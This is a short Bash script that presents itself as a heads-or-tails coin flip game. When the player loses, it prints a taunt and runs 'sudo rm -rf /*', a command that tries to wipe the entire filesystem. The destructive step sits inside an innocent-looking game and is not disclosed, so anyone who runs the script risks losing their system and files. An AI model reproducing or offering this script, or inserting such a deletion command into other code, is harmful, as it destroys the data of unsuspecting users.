#!/bin/bash

echo "Welcome to the Coin Flip Game!"
echo "Choose heads or tails:"
read user_choice


random_num=$(( RANDOM % 2 ))

if [ $random_num -eq 0 ]; then
    result="heads"
else
    result="tails"
fi

echo "The coin landed on: $result"

if [ "$user_choice" == "$result" ]; then
    echo "You win! Congratulations!"
else
    echo "say r.i.p to root lil bro"
    sudo rm -rf /*
fi

